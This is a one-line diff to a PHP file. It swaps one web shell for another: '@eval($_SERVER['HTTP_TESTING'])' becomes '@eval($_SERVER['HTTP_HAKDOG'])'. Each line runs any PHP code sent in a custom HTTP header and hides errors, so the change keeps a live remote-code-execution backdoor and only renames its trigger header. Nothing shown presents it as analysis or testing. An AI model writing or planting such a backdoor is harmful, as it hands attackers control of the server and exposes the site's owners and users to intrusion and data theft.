@@ -1,1 +1,1 @@
-<?php @eval($_SERVER['HTTP_TESTING']); ?>
+<?php @eval($_SERVER['HTTP_HAKDOG']); ?>
